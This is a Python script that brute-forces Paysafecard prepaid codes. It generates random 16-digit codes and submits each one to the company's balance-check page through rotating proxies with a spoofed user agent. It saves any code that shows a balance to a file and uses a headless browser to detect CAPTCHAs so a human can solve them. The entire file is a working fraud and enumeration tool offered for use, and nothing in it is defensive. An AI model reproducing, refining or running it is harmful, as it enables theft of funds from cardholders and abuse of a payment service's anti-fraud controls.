# Made by Cocorino with love <3

import random
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
from pystyle import Colors, Colorate
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
from datetime import datetime
from selenium.common.exceptions import NoSuchElementException
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime

def setup_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage") 
    chrome_options.add_argument("--disable-extensions")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    return driver

driver = setup_driver()

print(f'\33]0;PRJKT\a', end='', flush=True)

print(Colorate.Horizontal(Colors.blue_to_red, "discord.gg/---\n", 1))

print(Colorate.Horizontal(Colors.blue_to_green, """
 ▄▄·        ▄▄·       ▄▄▄  ▪   ▐ ▄       
▐█ ▌▪ ▄█▀▄ ▐█ ▌▪ ▄█▀▄ ▀▄ █·██ •█▌▐█ ▄█▀▄ 
██ ▄▄▐█▌.▐▌██ ▄▄▐█▌.▐▌▐▀▀▄ ▐█·▐█▐▐▌▐█▌.▐▌
▐███▌▐█▌.▐▌▐███▌▐█▌.▐▌▐█•█▌▐█▌██▐█▌▐█▌.▐▌
·▀▀▀  ▀█▄▀▪·▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀ █▪ ▀█▄▀▪    
""", 1))

while True:
    input(Fore.BLUE + "\nPress enter to start\n")
    start_time = time.time()
    while True:
        numbers = [0]
        for _ in range(15):
            numbers.append(random.randint(1, 9))

        formatted_numbers = []
        for i, num in enumerate(numbers):
            formatted_numbers.append(str(num))
            if (i + 1) % 4 == 0:
                formatted_numbers.append(" ")

        card_code = "".join(formatted_numbers)
        url = "https://www.paysafecard.com/en-gb/balance-check/"
        data = {'paysafecard_code': card_code}
        proxies = {
            "http": "FILL THIS",
            "https": "FILL THIS"
        }

        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
            response = requests.post(url, data=data, proxies=proxies ,headers=headers)
            if response.status_code == 404:
                print(Fore.RED + f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error: 404 Page not found.")
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            balance = soup.find('div', {'class': 'balance-value'})
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if balance:
                print(Fore.GREEN + f"[{current_time}] Found a paysafe worth {balance.text}")
                with open("balance.txt", "a") as f:
                    f.write(f"""
                    
                    

                    Card code: {card_code}\nBalance: {balance.text}\n
                    """)
                break
            else:
                print(Fore.RED + f"[{current_time}] {''.join(formatted_numbers)} - Verified, no money")
                print(f'\33]0;PRJKT || 120 ACTIVE ROTATING PROXY SERVERS ||\a', end='', flush=True)
        except requests.RequestException as e:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(Fore.RED + f"[{current_time}] An error occurred: {e}")

        # CAPTCHA detection
        driver.get(url)
        try:
            captcha_element = driver.find_element(By.XPATH, "//iframe[contains(@src, 'captcha')]")
            if captcha_element:
                print(Fore.YELLOW + f"[{current_time}] CAPTCHA detected. Please solve it manually.")
                input("Press Enter after solving CAPTCHA...")
            else:
                print(Fore.YELLOW + f"[{current_time}] No CAPTCHA detected.")
        except NoSuchElementException:
            print(Fore.YELLOW + f"[{current_time}] No CAPTCHA detected.")
        except Exception as e:
            print(Fore.YELLOW + f"[{current_time}] Error while checking for CAPTCHA: {e}")

    user_input = input(Fore.CYAN + "You want to restart the script ? (y/n): ")
    if user_input.lower() == "n":
        break

driver.quit()   